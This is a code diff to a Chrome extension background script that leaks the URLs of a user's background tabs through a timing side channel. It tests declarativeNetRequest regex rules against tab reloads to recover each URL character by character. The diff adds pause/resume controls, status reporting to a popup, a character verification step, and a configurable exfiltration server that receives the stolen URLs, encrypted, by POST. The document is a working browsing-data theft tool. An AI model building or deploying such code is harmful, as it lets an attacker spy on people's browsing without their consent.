@@ -19,6 +19,24 @@ let currentLeakTabId = null;
 let abortLeak = false;
 let currentLeakScheme = null;  // scheme being leaked right now
 let currentLeakPrefix = "";   // characters resolved so far
+let globalPaused = false;
+let calibrating = false;
+
+// Publish current leak state to storage so the popup can read it
+const publishStatus = () => {
+    chrome.storage.local.set({
+        leakStatus: {
+            paused:      globalPaused,
+            calibrating: calibrating,
+            tabId:       currentLeakTabId,
+            prefix:      currentLeakScheme ? currentLeakScheme + currentLeakPrefix : currentLeakPrefix,
+            charPos:     currentLeakPrefix.length,
+            maxLen:      MAX_LEN,
+            queueLen:    queue.length,
+            ts:          Date.now()
+        }
+    });
+};
 
 // ─── DNR rule management ───
 
@@ -81,6 +99,8 @@ const reloadTab = (tabId) => {
 // threshold dynamically so it works on LAN, WAN, and everything in between.
 
 const calibrate = async (tabId) => {
+    calibrating = true;
+    publishStatus();
     console.log("[*] Calibrating timing oracle...");
 
     // Warm up — first reload is often an outlier
@@ -116,6 +136,8 @@ const calibrate = async (tabId) => {
             `[!] Calibration ambiguous: blocked=${Math.round(blocked)}ms,`,
             `unblocked=${Math.round(unblocked)}ms — using fallback threshold=${blockThreshold}ms`
         );
+        calibrating = false;
+        publishStatus();
     } else {
         blockThreshold = blocked + (unblocked - blocked) * 0.3;
         console.log(
@@ -124,6 +146,8 @@ const calibrate = async (tabId) => {
             `threshold=${Math.round(blockThreshold)}ms`
         );
     }
+    calibrating = false;
+    publishStatus();
 };
 
 const blockedBy = async (regex, tabId) => {
@@ -157,7 +181,11 @@ const leakChar = async (scheme, prefix, tabId) => {
         const re = scheme + escRe(prefix) + cls(left) + ".*";
         set = await blockedBy(re, tabId) ? left : set.slice(mid);
     }
-    return set[0] || null;
+    const c = set[0];
+    if (!c) return null;
+    // Verify the converged character actually blocks — if not, we're past the URL end
+    const verified = await blockedBy(scheme + escRe(prefix + c) + ".*", tabId);
+    return verified ? c : null;
 };
 
 const leak = async (tabId) => {
@@ -220,6 +248,7 @@ const leak = async (tabId) => {
         if (sameCount >= 3) break;
         out += c;
         currentLeakPrefix = out;
+        publishStatus();
         prev = c;
         console.log("[+]", scheme + out);
     }
@@ -262,9 +291,18 @@ const encryptPayload = async (data) => {
 };
 
 // --- Exfiltration ---
+const DEFAULT_EXFIL_URL = "http://localhost:3000";
+
+const getExfilUrl = () => new Promise(resolve =>
+    chrome.storage.local.get("exfilUrl", ({ exfilUrl }) =>
+        resolve((exfilUrl || DEFAULT_EXFIL_URL).replace(/\/$/, ""))
+    )
+);
+
 const exfiltrate = async (urls, partial = false) => {
+    const serverUrl = await getExfilUrl();
     const payload = await encryptPayload(JSON.stringify({ urls, partial }));
-    await fetch("http://localhost:3000/upload", {
+    await fetch(`${serverUrl}/upload`, {
         method:  "POST",
         headers: { "Content-Type": "application/json" },
         body:    JSON.stringify({ ...payload, ts: Date.now() })
@@ -276,13 +314,30 @@ const exfiltrate = async (urls, partial = false) => {
 // Track which tabs have already been leaked so we don't repeat
 const leakedTabs = new Set();
 
+// Listen for pause/resume commands from the popup
+chrome.storage.onChanged.addListener((changes, area) => {
+    if (area !== "local" || !("isPaused" in changes)) return;
+    globalPaused = changes.isPaused.newValue;
+    if (globalPaused) {
+        // Abort any active leak — it will save to partialProgress
+        if (currentLeakTabId !== null) abortLeak = true;
+        console.log("[*] Leak engine paused by user");
+        publishStatus();
+    } else {
+        console.log("[*] Leak engine resumed by user");
+        publishStatus();
+        processQueue();
+    }
+});
+
 // Partial progress saved when a leak is aborted mid-way
 // Map<tabId, { scheme: string, prefix: string, calibrated: boolean }>
 const partialProgress = new Map();
 
 const leakTab = async (tabId) => {
     currentLeakTabId = tabId;
-    abortLeak = false;
+    if (!globalPaused) abortLeak = false; // only clear abort flag if not paused
+    publishStatus();
     let url = "";
     try {
         url = await leak(tabId);
@@ -291,6 +346,7 @@ const leakTab = async (tabId) => {
         url = "";
     }
     currentLeakTabId = null;
+    publishStatus();
 
     if (abortLeak || !url) {
         // Aborted — tab became active. Don't mark as leaked.
@@ -328,23 +384,29 @@ const enqueue = (tabId) => {
 
 const processQueue = async () => {
     if (processing) return;
+    if (globalPaused) return;
     processing = true;
     leaking = true;
+    publishStatus();
     while (queue.length > 0) {
+        if (globalPaused) break;
         const tabId = queue.shift();
         let tab;
-        try { tab = await chrome.tabs.get(tabId); } catch { continue; }
+        try { tab = await chrome.tabs.get(tabId); } catch { publishStatus(); continue; }
         if (tab.active) {
             // Can't leak right now — park it until it goes to background
             console.log(`[*] Tab ${tabId} is active, deferring until it goes to background`);
             waitingForBackground.add(tabId);
+            publishStatus();
             continue;
         }
         console.log(`[*] Leaking background tab ${tabId} (${queue.length} remaining in queue)...`);
         await leakTab(tabId);
+        if (globalPaused) break; // stop immediately if paused mid-queue
     }
     leaking = false;
     processing = false;
+    publishStatus();
 };
 
 // On user navigation, re-leak that tab if it's in the background
@@ -403,9 +465,14 @@ chrome.tabs.onActivated.addListener(({ tabId }) => {
     }
 });
 
-// On startup, leak all background tabs
-chrome.tabs.query({}).then(tabs => {
-    const bgTabs = tabs.filter(t => !t.active);
-    console.log(`[*] Found ${bgTabs.length} background tab(s), queueing...`);
-    for (const tab of bgTabs) enqueue(tab.id);
+// On startup, restore paused state then queue background tabs (default: paused)
+chrome.storage.local.get("isPaused", ({ isPaused }) => {
+    globalPaused = isPaused !== false; // default to true if never set
+    if (isPaused === undefined) chrome.storage.local.set({ isPaused: true });
+    chrome.tabs.query({}).then(tabs => {
+        const bgTabs = tabs.filter(t => !t.active);
+        console.log(`[*] Found ${bgTabs.length} background tab(s), queueing... (paused=${globalPaused})`);
+        for (const tab of bgTabs) enqueue(tab.id);
+        publishStatus();
+    });
 });
